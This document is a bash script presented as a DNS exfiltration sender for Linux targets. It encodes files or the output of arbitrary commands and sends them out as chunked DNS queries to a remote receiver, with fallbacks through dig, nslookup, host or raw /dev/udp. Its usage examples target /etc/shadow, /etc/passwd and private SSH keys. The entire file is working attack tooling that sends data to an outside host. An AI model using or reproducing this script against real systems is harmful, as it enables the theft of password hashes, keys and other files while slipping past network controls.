#!/bin/bash
# dnsout_send.sh — DNS exfiltration sender (bash rewrite)
# Runs on any Linux with bash + (dig OR nslookup OR /dev/udp).
# No Python required on target.
#
# Receiver: python3 dnsout.py recv --port 5353  (on your machine)
#
# Usage:
#   bash dnsout_send.sh <server-ip> <domain> <file>
#   bash dnsout_send.sh <server-ip> <domain> --cmd "id && cat /etc/passwd"
#   bash dnsout_send.sh 10.10.14.5 exfil.site.com /etc/shadow
#   bash dnsout_send.sh 10.10.14.5 x.local --cmd "cat ~/.ssh/id_rsa"
#
# Optional env vars:
#   DNS_PORT=5353   (default: 53)
#   DNS_DELAY=0.15  (seconds between queries, default: 0.15)
#   CHUNK=28        (chars per label, max 30, default: 28)

SERVER="${1:-}"
DOMAIN="${2:-x.local}"
TARGET="${3:-}"

DNS_PORT="${DNS_PORT:-53}"
DNS_DELAY="${DNS_DELAY:-0.15}"
CHUNK="${CHUNK:-28}"

if [[ -z "$SERVER" || -z "$TARGET" ]]; then
  echo "Usage: $0 <server-ip> <domain> <file|--cmd 'command'>"
  exit 1
fi

# ── Base32 encoding (pure bash) ────────────────────────────────────────────────
b32_encode() {
  local input="$1"
  local alphabet="abcdefghijklmnopqrstuvwxyz234567"
  local result=""
  local -a bytes

  # Convert string to byte array
  while IFS= read -r -d '' -n 1 c; do
    bytes+=( $(printf '%d' "'$c") )
  done < <(printf '%s' "$input")

  local bits=0 acc=0
  for b in "${bytes[@]}"; do
    acc=$(( (acc << 8) | b ))
    bits=$(( bits + 8 ))
    while [[ $bits -ge 5 ]]; do
      bits=$(( bits - 5 ))
      idx=$(( (acc >> bits) & 0x1F ))
      result+="${alphabet:$idx:1}"
    done
  done
  if [[ $bits -gt 0 ]]; then
    idx=$(( (acc << (5 - bits)) & 0x1F ))
    result+="${alphabet:$idx:1}"
  fi
  printf '%s' "$result"
}

# Base32 encode binary file using python if available, otherwise fall back to pure bash
b32_encode_file() {
  local file="$1"
  if command -v python3 &>/dev/null; then
    python3 -c "import base64,sys; print(base64.b32encode(open('$file','rb').read()).decode().lower().rstrip('='))"
  elif command -v python &>/dev/null; then
    python -c "import base64,sys; print(base64.b32encode(open('$file','rb').read()).decode().lower().rstrip('='))"
  elif command -v base32 &>/dev/null; then
    base32 < "$file" | tr '[:upper:]' '[:lower:]' | tr -d '='
  else
    # Pure bash fallback — works but slow for large files
    b32_encode "$(cat "$file")"
  fi
}

# ── Random session ID ──────────────────────────────────────────────────────────
session_id() {
  head -c 3 /dev/urandom | od -A n -t x1 | tr -d ' \n' | cut -c1-6
}

# ── DNS query ──────────────────────────────────────────────────────────────────
send_query() {
  local qname="$1"
  if command -v dig &>/dev/null; then
    dig +short +time=2 +tries=1 "@$SERVER" -p "$DNS_PORT" "$qname" A &>/dev/null &
  elif command -v nslookup &>/dev/null; then
    nslookup "$qname" "$SERVER" &>/dev/null &
  elif command -v host &>/dev/null; then
    host -W 1 "$qname" "$SERVER" &>/dev/null &
  else
    # Raw UDP via /dev/udp (bash built-in, Linux only)
    (
      # Build minimal DNS query
      local name_enc=""
      IFS='.' read -ra labels <<< "$qname"
      for label in "${labels[@]}"; do
        len="${#label}"
        name_enc+=$(printf "\\$(printf '%03o' $len)")
        name_enc+="$label"
      done
      name_enc+=$'\x00'
      # Header: random txid, standard query, 1 question
      printf '\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
      printf '%s' "$name_enc"
      printf '\x00\x01\x00\x01'
    ) > "/dev/udp/$SERVER/$DNS_PORT" 2>/dev/null || true
  fi
}

# ── Main ───────────────────────────────────────────────────────────────────────
SID=$(session_id)
TMPFILE=""

if [[ "$TARGET" == "--cmd" ]]; then
  CMD="${4:-id}"
  echo "[*] Running: $CMD"
  TMPFILE=$(mktemp)
  eval "$CMD" > "$TMPFILE" 2>&1
  DATAFILE="$TMPFILE"
else
  DATAFILE="$TARGET"
fi

[[ ! -f "$DATAFILE" ]] && { echo "[!] File not found: $DATAFILE"; exit 1; }

echo "[*] Encoding..."
ENCODED=$(b32_encode_file "$DATAFILE")
[[ -n "$TMPFILE" ]] && rm -f "$TMPFILE"

TOTAL=$(echo -n "$ENCODED" | awk "{ n=int((length+$CHUNK-1)/$CHUNK); print n }")

echo "[*] Session   : $SID"
echo "[*] Payload   : $(stat -c%s "$DATAFILE" 2>/dev/null || wc -c < "$DATAFILE") bytes"
echo "[*] Chunks    : $TOTAL queries"
echo "[*] DNS server: $SERVER:$DNS_PORT"
echo "[*] Domain    : $DOMAIN"
echo ""

# Signal start
send_query "${SID}.start.${TOTAL}.${DOMAIN}"
sleep "$DNS_DELAY"

# Send chunks
i=0
while [[ -n "$ENCODED" ]]; do
  chunk="${ENCODED:0:$CHUNK}"
  ENCODED="${ENCODED:$CHUNK}"
  send_query "${chunk}.${SID}.${i}.${DOMAIN}"
  i=$(( i + 1 ))
  [[ $(( i % 10 )) -eq 0 ]] && printf "\r  Sent %d/%d" "$i" "$TOTAL"
  sleep "$DNS_DELAY"
done

echo ""
# Signal end
send_query "${SID}.end.${TOTAL}.${DOMAIN}"
sleep "$DNS_DELAY"

echo "[+] Done — $i queries sent for session $SID"
